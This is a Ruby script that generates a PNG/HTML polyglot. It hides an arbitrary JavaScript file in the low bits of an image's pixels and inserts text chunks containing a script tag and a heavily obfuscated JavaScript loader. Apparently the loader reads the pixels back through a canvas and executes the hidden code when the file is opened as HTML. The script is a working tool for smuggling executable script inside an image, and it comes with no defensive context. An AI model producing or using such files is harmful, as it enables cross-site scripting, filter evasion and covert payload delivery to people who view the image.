# coding: UTF-8
require "zlib"
require "RMagick"
include Magick

if ARGV[0].nil? || ARGV[1].nil? then
  puts "error."
  exit
end

img = ImageList.new(ARGV[1])
width = img.columns
height = img.rows

js_text = File.open(ARGV[0]).read
js_size = js_text.bytesize

if js_size > (width * height * 3 / 4) then
  puts "error."
  exit
end

depth, color_type = 8, 2

# グラデーションのベタデータ
cnt = 0
raw_data = []

for y in 0...height do
  w_color = []
  for x in 0...width do
    src = img.pixel_color(x, y)
    color = [src.red, src.green, src.blue]

    for i in 0...color.size do
      char = (js_text.length > cnt/4) ? js_text[cnt/4].ord : 0x00
      bits = ((char << (cnt%4 * 2)) % 256) >> 6
      color[i] = ((color[i] >> 2) << 2) | bits
      cnt += 1
    end

    w_color.push(color.clone)
  end
  raw_data.push(w_color.flatten)
end

# チャンクのバイト列生成関数
def chunk(type, data)
  [data.bytesize, type, data, Zlib.crc32(type + data)].pack("NA4A*N")
end

# ファイルシグニチャ
print "\x89PNG\r\n\x1a\n"

# ヘッダ
print chunk("IHDR", [width, height, 8, 2, 0, 0, 0].pack("NNCCCCC"))

print chunk("tEXT", "<MeTA\x0AcHArSEt\x0A=\x0AUtf-8\x0A>")
print chunk("tEXT", "<ScRiPT\x0A>\x0A/*\x0A")
print chunk("tEXT", "\x0A" + <<'EOS')
*/
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+(![]+"")[$._$_]+"("+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(\\"+$.__$+$.$$_+$.___+","+$.$_$_+","+$.$$__+",\\"+$.__$+$.$_$+$._$$+","+$.$$$_+",\\"+$.__$+$.$$_+$._$_+"){"+$.$$$_+"="+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"("+$.$$__+"){\\"+$.__$+$.$$_+$._$_+$.$$$_+$.__+$._+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"("+$.$$__+"<"+$.$_$_+"?'':"+$.$$$_+"(\\"+$.__$+$.$$_+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$$_+$._$$+$.$$$_+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$$_+$.__+"("+$.$$__+"/"+$.$_$_+")))+(("+$.$$__+"="+$.$$__+"%"+$.$_$_+")>"+$._$$+$.$_$+"?\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"."+$.$$$$+"\\"+$.__$+$.$$_+$._$_+$._$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.$_$+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.___+$._$$+$._$+$.$$_$+$.$$$_+"("+$.$$__+"+"+$._$_+$.$__$+"):"+$.$$__+"."+$.__+$._$+"\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"("+$._$$+$.$$_+"))};\\"+$.__$+$.$_$+$.__$+$.$$$$+"(!''.\\"+$.__$+$.$$_+$._$_+$.$$$_+"\\"+$.__$+$.$$_+$.___+(![]+"")[$._$_]+$.$_$_+$.$$__+$.$$$_+"(/^/,\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+")){\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+(![]+"")[$._$_]+$.$$$_+"("+$.$$__+"--)\\"+$.__$+$.$$_+$._$_+"["+$.$$$_+"("+$.$$__+")]=\\"+$.__$+$.$_$+$._$$+"["+$.$$__+"]||"+$.$$$_+"("+$.$$__+");\\"+$.__$+$.$_$+$._$$+"=["+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"("+$.$$$_+"){\\"+$.__$+$.$$_+$._$_+$.$$$_+$.__+$._+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$_+"["+$.$$$_+"]}];"+$.$$$_+"="+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(){\\"+$.__$+$.$$_+$._$_+$.$$$_+$.__+$._+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"'\\\\\\\\\\"+$.__$+$.$$_+$.$$$+"+'};"+$.$$__+"="+$.__$+"};\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+(![]+"")[$._$_]+$.$$$_+"("+$.$$__+"--)\\"+$.__$+$.$_$+$.__$+$.$$$$+"(\\"+$.__$+$.$_$+$._$$+"["+$.$$__+"])\\"+$.__$+$.$$_+$.___+"=\\"+$.__$+$.$$_+$.___+".\\"+$.__$+$.$$_+$._$_+$.$$$_+"\\"+$.__$+$.$$_+$.___+(![]+"")[$._$_]+$.$_$_+$.$$__+$.$$$_+"(\\"+$.__$+$.$_$+$.$$_+$.$$$_+"\\"+$.__$+$.$$_+$.$$$+"\\"+$.$__+$.___+"\\"+$.__$+$._$_+$._$_+$.$$$_+"\\"+$.__$+$.$__+$.$$$+"\\"+$.__$+$.___+$.$_$+"\\"+$.__$+$.$$$+$.___+"\\"+$.__$+$.$$_+$.___+"('\\\\\\\\"+$.$_$$+"'+"+$.$$$_+"("+$.$$__+")+'\\\\\\\\"+$.$_$$+"','\\"+$.__$+$.$__+$.$$$+"'),\\"+$.__$+$.$_$+$._$$+"["+$.$$__+"]);\\"+$.__$+$.$$_+$._$_+$.$$$_+$.__+$._+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$.___+"}('(\\"+$.__$+$.$_$+$.$$_+"(){"+$.$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.$_$+$.___+"="+$.$$_+".\\"+$.__$+$.___+$.$$_+";"+$.$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.$_$+$.__$+"="+$.$$_+"."+(![]+"")[$._$_]+"(\\\\'\\"+$.__$+$.___+$.$_$+"\\\\');\\"+$.__$+$.$_$+$.__$+".\\"+$.__$+$.$$_+$.___+"(\\\\'\\"+$.__$+$.$$$+$._$_+"\\\\',\\\\'#\\\\');\\"+$.__$+$.$_$+$.__$+".\\"+$.__$+$.$$$+$.___+"(\\\\'\\"+$.__$+$.$$_+$.$$$+"\\\\',\\"+$.__$+$.$_$+$.$$_+"(){"+$.$_$+"\\"+$.$__+$.___+$.$_$_+"="+$.$$_+"."+(![]+"")[$._$_]+"(\\\\'\\"+$.__$+$.$$_+$.$$_+"\\\\');\\"+$.__$+$.$_$+$.___+"."+$._$+"("+$.$_$_+");"+$.$_$+"\\"+$.$__+$.___+$.$_$$+"="+$.$_$_+".\\"+$.__$+$.$_$+$._$_+"=\\"+$.__$+$.$_$+$.__$+".\\"+$.__$+$.$_$+$._$_+";"+$.$_$+"\\"+$.$__+$.___+$.$$__+"="+$.$_$_+".\\"+$.__$+$.$_$+$._$$+"=\\"+$.__$+$.$_$+$.__$+".\\"+$.__$+$.$_$+$._$$+";"+$.$$$+"="+$.$_$_+"."+$.__+"(\\\\'\\"+$.__$+$.$$_+$._$$+"\\\\');"+$.$$$+".\\"+$.__$+$.$$_+$.__$+"(\\"+$.__$+$.$_$+$.__$+","+$.___+","+$.___+");"+$.$_$+"\\"+$.$__+$.___+$.$$_$+"="+$.$$$+".\\"+$.__$+$.___+$.__$+"("+$.___+","+$.___+","+$.$_$$+","+$.$$__+").\\"+$.__$+$.$$_+$._$_+";"+$.$_$+"\\"+$.$__+$.___+$.$$$_+"="+$.___+";"+$.$_$+"\\"+$.$__+$.___+$.$$$$+"="+$.___+";"+$._+"("+$.$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.$__+$.$$$+"="+$.___+","+$.$__$+"=\\\\'\\\\',"+$.$___+";\\"+$.__$+$.$__+$.$$$+"<"+$.$$_$+".\\"+$.__$+$.$$$+$.__$+";\\"+$.__$+$.$__+$.$$$+"+=(\\"+$.__$+$.$__+$.$$$+"%"+$.$__+"=="+$._$_+")?"+$._$_+":"+$.__$+"){"+$.$___+"="+$.$$_$+"[\\"+$.__$+$.$__+$.$$$+"];"+$.$$$_+"+=\\"+$.__$+$.___+$._$_+"("+$.$___+".\\"+$.__$+$.___+$._$$+"("+$._$_+").\\"+$.__$+$.___+$.$__+"(-"+$._$_+"),"+$._$_+")<<("+$._$_+"*("+$._$$+"-"+$.$$$$+"%"+$.$__+"));\\"+$.__$+$.$_$+$.$_$+"("+$.$$$$+"%"+$.$__+"=="+$._$$+"){\\"+$.__$+$.$_$+$.$_$+"("+$.$$$_+"==="+$.___+")\\"+$.__$+$.___+$.$$$+";"+$.$__$+"+=\\"+$.__$+$.__$+$.___+".\\"+$.__$+$.__$+$.__$+"("+$.$$$_+");"+$.$$$_+"="+$.___+"}"+$.$$$$+"++}\\"+$.__$+$.__$+$._$_+"("+$.$__$+")});\\"+$.__$+$.$_$+$.___+"."+$._$+"(\\"+$.__$+$.$_$+$.__$+")})();',"+$.$__+$.$$_+","+$.$__+$.$$_+",'|||||\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"|"+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"|"+$.$$__+$.$_$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.___+$._$$+$.__+"\\"+$.__$+$.$$$+$.___+"|"+$.$_$$+"\\"+$.__$+$.$$$+$.__$+$.__+$.$$$_+"|"+$.$$__+$._$+$.$$_$+$.$$$_+"||||||||||\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.__$+$.$$_$+$.__+"\\"+$.__$+$.$_$+$.___+"|\\"+$.__$+$.$_$+$.___+$.$$$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$__+$.$$$+"\\"+$.__$+$.$_$+$.___+$.__+"|"+$.$$__+"\\"+$.__$+$.$$_+$._$_+$.$$$_+$.$_$_+$.__+$.$$$_+"\\"+$.__$+$.___+$.$_$+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"|\\"+$.__$+$.$_$+$.__$+$.$$$$+"|"+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"|"+$.$_$_+"\\"+$.__$+$.$$_+$.___+"\\"+$.__$+$.$$_+$.___+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.$$_$+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+(![]+"")[$._$_]+$.$$_$+"|\\"+$.__$+$.$$_+$._$$+$.$$$_+$.__+"\\"+$.__$+$.___+$.__$+$.__+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.$_$$+$._+$.__+$.$$$_+"|"+$.$$_$+"\\"+$.__$+$.$$_+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$_$+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$$$_+"|"+$.$$_$+$.$_$_+$.__+$.$_$_+"|"+$._$_+$.$$_$+"|\\"+$.__$+$.$__+$.$$$+$.$$$_+$.__+"\\"+$.__$+$.___+$._$$+$._$+"\\"+$.__$+$.$_$+$.$$_+$.__+$.$$$_+"\\"+$.__$+$.$$$+$.___+$.__+"|"+$.$$$$+$._$+"\\"+$.__$+$.$$_+$._$_+"|"+$.$$__+$.$_$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$.$$_+$._$$+"|"+(![]+"")[$._$_]+$._$+$.$_$_+$.$$_$+"|"+$.$_$_+$.$$_$+$.$$_$+"\\"+$.__$+$.___+$.$_$+"\\"+$.__$+$.$$_+$.$$_+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"\\"+$.__$+$.__$+$.$__+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.$$$_+"\\"+$.__$+$.$$_+$._$_+"|"+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+$.__+"\\"+$.__$+$.$_$+$.___+"|\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"|\\"+$.__$+$.$__+$.$$$+$.$$$_+$.__+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$_$+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$$$_+"\\"+$.__$+$.___+$.$__+$.$_$_+$.__+$.$_$_+"|\\"+$.__$+$.$$_+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$$_+$._$$+$.$$$_+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$$_+$.__+"|"+$.__+$._$+"\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"|\\"+$.__$+$.$$_+$._$$+$._+$.$_$$+"\\"+$.__$+$.$$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"|\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.$__+$.$$$+"|"+$.$_$$+$._$+$.$$_$+"\\"+$.__$+$.$$$+$.__$+"|"+$.$_$$+"\\"+$.__$+$.$$_+$._$_+$.$$$_+$.$_$_+"\\"+$.__$+$.$_$+$._$$+"|\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"|"+$.$$$$+"\\"+$.__$+$.$$_+$._$_+$._$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.$_$+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.___+$._$$+$._$+$.$$_$+$.$$$_+"|"+$.$$$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+(![]+"")[$._$_]+"'.\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$.___+(![]+"")[$._$_]+"\\"+$.__$+$.$_$+$.__$+$.__+"('|'),"+$.___+",{}))"+"\"")())();
/*
EOS
print chunk("tEXT", "\x0A*/</sCRipT\x0A>\x0A")

# 画像データ
img_data = raw_data.map {|line| ([0] + line.flatten).pack("C*") }.join
print chunk("IDAT", Zlib::Deflate.deflate(img_data))

# 終端
print chunk("IEND", "")
